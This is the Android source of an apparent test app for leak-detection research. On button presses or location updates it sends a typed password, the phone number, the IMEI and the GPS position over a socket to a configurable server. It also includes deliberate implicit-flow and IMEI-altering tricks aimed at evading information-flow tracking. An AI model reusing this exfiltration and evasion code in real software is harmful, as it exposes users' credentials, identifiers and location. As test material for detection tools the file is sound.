package edu.fandm.enovak.leaks;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.MenuItemCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.ShareActionProvider;
import android.telephony.TelephonyManager;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class Main extends AppCompatActivity {
    private final static String TAG = Main.class.getName();

    private TelephonyManager telephonyManager;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private final static int MY_PERMISSIONS_REQUEST = 1;
    private final static String[] PERMS = new String[]{Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.INTERNET,
            Manifest.permission.READ_PHONE_STATE};

    private String host;
    private Integer port;

    private String imeiNumber;
    private String phoneNumber;

    private ToggleButton tb;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        PreferenceManager.setDefaultValues(this, R.xml.preferences, false);


        ///PHYO
        if ((ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
                && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
                && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED))
        {
            Toast.makeText(this, "Location and Phone state permissions required!", Toast.LENGTH_SHORT).show();
            //request the permission
            Log.d(TAG, "Requesting permissions!");
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.INTERNET,
                    Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS},
                    MY_PERMISSIONS_REQUEST);
        }

        telephonyManager = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE); ///PHYO

        TextView tv = (TextView)findViewById(R.id.main_tv_log);
        tv.setMovementMethod(new ScrollingMovementMethod());

        ActivityCompat.requestPermissions(this, PERMS, MY_PERMISSIONS_REQUEST);

        tb = (ToggleButton)findViewById(R.id.main_tb_location);
    }

    @Override
    protected void onResume(){
        super.onResume();

        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);

        Boolean showLog = sp.getBoolean("pref_cb_log_onoff", true);
        host = sp.getString("pref_et_ip", "this ain't it!");
        port = Integer.parseInt(sp.getString("pref_et_port", "-1"));

        Log.d(TAG, "showLog: " + showLog + "    hostName: " + host + "    port: " + port);


        TextView tv_title = findViewById(R.id.main_tv_log_title);
        TextView tv_log = findViewById(R.id.main_tv_log);
        if(!showLog){
            tv_title.setVisibility(View.INVISIBLE);
            tv_log.setVisibility(View.INVISIBLE);
        } else {
            tv_title.setVisibility(View.VISIBLE);
            tv_log.setVisibility(View.VISIBLE);
        }
    }

    public boolean onCreateOptionsMenu(Menu m){
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.main_menu, m);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item){
        switch(item.getItemId()){
            case R.id.main_menu_settings:
                Intent i = new Intent(this, SettingsAct.class);
                startActivity(i);
                break;


            case R.id.main_menu_simple_test:
                i = new Intent(this, SimpleLeak.class);
                startActivity(i);
                break;

        }
        return true;
    }


    public void startStopGPS(View v){

        Log.d(TAG, "tb checked: " + tb.isChecked());

        if(tb.isChecked()){

            // CHECK if permission is not granted (don't want to
            // request permission if they're granted already!)
            if (ContextCompat.checkSelfPermission(this ,
                    Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED){
                Toast.makeText(this, "Location permissions required!", Toast.LENGTH_SHORT).show();
                tb.setChecked(false);

                //request the permission
                Log.d(TAG, "Requesting permissions!");
                ActivityCompat.requestPermissions(this, PERMS, MY_PERMISSIONS_REQUEST);


                return;

            } else {
                startLocationUpdates();
            }

        } else {
            stopLocationUpdates();
        }


        ///PHYO
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED)
        {
            startLocationUpdates();
        }
        else {
            stopLocationUpdates();
        }

    }


    public void leakPasswd(View v){
        EditText et = (EditText)findViewById(R.id.main_et_passwd);
        String pass = et.getText().toString();

        prependToLog("Leaked Password: " + pass);

        ServerLeakTask slt = new ServerLeakTask();

        // Just to look at bytecode of implicit flows
        if(pass.equals("password")){
            String coded = "a";
            slt.execute(coded);
        } else{
            slt.execute(pass);
        }



    }

    ///PHYO
    public void leakPhoneNo(View v){
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
            phoneNumber = telephonyManager.getLine1Number();
        }

        if(phoneNumber == null){
            phoneNumber = "555-1234";
        }

        prependToLog("Leaked Phone Number: " + phoneNumber);

        ServerLeakTask slt = new ServerLeakTask();
        slt.execute(phoneNumber);
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST: {
                // If request is cancelled, the result arrays are empty.

                boolean flag = false;
                for(int res : grantResults){
                    if(res != PackageManager.PERMISSION_GRANTED){
                        flag = true;
                    }
                }

                /*
                if(flag){
                    Toast.makeText(this, "Some leaks may not be possible.", Toast.LENGTH_SHORT).show();
                }
                */
                return;
            }
        }
    }

    public void startLocationUpdates(){

        // Acquire a reference to the system Location Manager
        locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
        // Define a listener that responds to location updates
        locationListener = new LocationListener() {

            public void onLocationChanged(Location location) {
                // Called when a new location is found by the network location provider.
                Log.d(TAG, "Location Changed: " + location);
                leakLoc(location);
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {
                Log.d(TAG, "Status Changed!: " + status);
            }

            public void onProviderEnabled(String provider) {
                Log.d(TAG, "Provider enabled: " + provider);
                registerListeners();
            }

            public void onProviderDisabled(String provider) {
                Log.d(TAG, "Provider disabled: " + provider);
                registerListeners();
            }
        };

        registerListeners();

    }

    private void registerListeners(){
        Log.d(TAG, "Registering listeners");
        try {

            // Register the listener with the Location Manager to receive location updates
            boolean success = false;
            if(locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)){
                locationManager.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, 0, 0, locationListener);
                success = true;
                Log.d(TAG, "Passive Provider Listening Enabled");
            }

            if(locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
                success = true;
                Log.d(TAG, "Network Provider Listening Enabled");
            }

            if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
                success = true;
                Log.d(TAG, "GPS Provider Listening Enabled");
            }

            if(success){
                Log.d(TAG, "Leaking turned on!!");
                //tb.setChecked(true); ///PHYO

                Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (lastKnownLocation != null) {
                    leakLoc(lastKnownLocation);
                }

            } else {
                Toast.makeText(this, "No providers available!", Toast.LENGTH_SHORT).show();
                Log.d(TAG, "Could not get a provider");
                stopLocationUpdates();
                return;
            }

        } catch (SecurityException se){
            Toast.makeText(this, "Insufficient permissions to get location data", Toast.LENGTH_LONG).show();
            stopLocationUpdates();
        }
    }

    public void stopLocationUpdates(){
        locationManager.removeUpdates(locationListener);
        //tb.setChecked(false); ///PHYO
    }

    public void leakLoc(Location loc){

        SimpleDateFormat mdformat = new SimpleDateFormat("HH:mm:ss");
        String strDate = mdformat.format(Calendar.getInstance().getTime());

        String newPart = "Leaked Location: (" + loc.getLatitude() + ", " + loc.getLongitude() + ") at " + strDate;
        prependToLog(newPart);

        ServerLeakTask slt = new ServerLeakTask();
        slt.execute(newPart);
    }


    public void leakIMEI(View v){
        if (ContextCompat.checkSelfPermission(this ,
                Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED){
            Toast.makeText(this, "Phone state permissions required!", Toast.LENGTH_SHORT).show();
        } else {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String IMEI_STR = telephonyManager.getDeviceId();
            Log.d(TAG, "Actual IMEI: "+ IMEI_STR);

            // a little challenge for IFT
            long imei = Long.parseLong(IMEI_STR);
            imei = imei + 1;
            IMEI_STR = String.valueOf(imei);
            // challenge over



            SimpleDateFormat mdformat = new SimpleDateFormat("HH:mm:ss");
            String strDate = mdformat.format(Calendar.getInstance().getTime());
            String newPart = "Leaked IMEI: (" + IMEI_STR + ") at " + strDate;
            prependToLog(newPart);

            ServerLeakTask slt = new ServerLeakTask();
            slt.execute(IMEI_STR);
        }

    }

    private void prependToLog(String newPart){
        TextView tv = (TextView)findViewById(R.id.main_tv_log);
        StringBuffer sb = new StringBuffer();

        sb.append(newPart + "\n");
        sb.append(tv.getText().toString());
        tv.setText(sb.toString());
    }


    class ServerLeakTask extends AsyncTask<String, Void, Void> {
        protected void onPreExecute(){

        }

        protected Void doInBackground(String... msgs){
            String msg = msgs[0];
            Log.d(TAG, "Sending: " + msg + "  to " + host + ":" + port);

            try {
                Socket s = new Socket(host, port);
                OutputStreamWriter out = new OutputStreamWriter(s.getOutputStream());

                // my server expects 64 bytes
                int min = Math.min(64, msg.length());
                out.write(msg, 0, min);
                out.flush(); // actually write / send

                // we're done!
                out.close();
                s.close();

            } catch (IOException ioe){
                ioe.printStackTrace();

            }
            return null;
        }

        protected void onPostExecute(Void v){
            //Toast.makeText(getApplicationContext(), "Message sent to server!", Toast.LENGTH_SHORT).show();
            Log.d(TAG, "Message sent to server!");
        }
    }
}
